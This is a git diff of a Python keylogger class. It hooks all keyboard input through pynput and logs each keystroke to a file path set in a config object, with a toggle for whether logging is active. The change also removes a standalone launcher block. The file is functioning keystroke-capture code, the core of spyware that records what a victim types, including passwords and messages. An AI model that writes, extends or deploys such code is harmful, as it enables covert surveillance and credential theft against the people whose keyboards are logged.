@@ -2,37 +2,25 @@ import shutil
 from pynput.keyboard import Key, Listener
 from datetime import datetime
 from threading import Thread
-
+from FileHandler import FileHandler
 
 
 class Keylogger(Thread):
 
-    def __init__(self, filehandler):
+    def __init__(self, config):
         Thread.__init__(self, name='keylogging')
-        self.__debug = False
-        self.__dateTime = datetime.now()
-        self.__filehandler = filehandler
+        self.__config = config
 
 
 
     def onPress(self, key):
-        if self.__debug:
+        if self.__config.debug:
             print(key, end='')
-        else:
-            self.__filehandler.writeToFile(key)
-
+        FileHandler.fileOut(self.__config.logPath + self.__config.logFileName, key)
+            
 
 
     def run(self):
         with Listener(on_press=self.onPress) as listener:
-            listener.join()
-
-
-
-if __name__ == "__main__":
-    from FileHandler import FileHandler
-    from os import system
-    system('cls')
-    fileHandler = FileHandler()
-    keylogger = Keylogger(fileHandler)
-    keylogger.start()
+            if self.__config.keyloggingIsActive:
+                listener.join()
